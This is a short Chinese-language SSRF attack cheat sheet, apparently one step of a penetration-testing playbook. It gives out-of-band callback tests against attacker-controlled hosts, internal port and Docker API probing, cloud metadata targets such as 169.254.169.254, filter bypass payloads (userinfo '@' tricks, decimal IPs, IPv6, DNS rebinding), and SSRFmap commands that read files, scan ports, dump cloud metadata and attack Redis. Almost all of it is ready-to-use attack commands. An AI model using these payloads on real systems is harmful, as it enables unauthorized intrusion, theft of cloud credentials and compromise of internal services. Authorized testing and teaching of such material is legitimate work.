# SSRF 秒杀卡 (≤50行)

## 一击
```
参数含 url/link/callback/redirect/fileUrl/imageUrl
→ 替换为 Burp Collaborator URL 或 http://<your-ip>:port
→ 看是否收到 DNS/HTTP 回调
```

## 内网探测
```
确认 SSRF → 内网常见端口扫描:
127.0.0.1:22/3306/6379/8080/9200/11211
→ 云环境: 169.254.169.254 (AWS/阿里云元数据)
→ Docker: 172.17.0.1:2375
```

## 绕过
```
@ 绕过: http://evil@127.0.0.1
URL编码: http://127.0.0.1 → http://2130706433 (十进制IP)
IPv6: http://[::1]:8080
DNS Rebinding: 域名轮询解析到内网IP
短链接: 短网址→内网URL
```

## 工具链固化（SSRFmap）
```
# 1. Burp 抓包存 req.txt（含参数行）→ 指定参数
python tools/SSRFmap/ssrfmap.py -r <req.txt> -p <url参数> -m readfiles        # 读文件
python tools/SSRFmap/ssrfmap.py -r <req.txt> -p <url参数> -m portscan --scan-ports 22,3306,6379,8080,9200
python tools/SSRFmap/ssrfmap.py -r <req.txt> -p <url参数> -m alibaba|aws|gce|docker   # 云元数据
python tools/SSRFmap/ssrfmap.py -r <req.txt> -p <url参数> -m redis --lhost <本机IP>   # 打Redis
# 2. OOB 判定: 参数换 http://<子域>.dnslog.cn → dnslog.py watch
```
模块列表: `ls tools/SSRFmap/modules/`（readfiles/redis/portscan/networkscan/docker/fastcgi/smtp 等）

→ 返回 S2: {有回调?, 能访问内网?, 端口?, 云环境?}
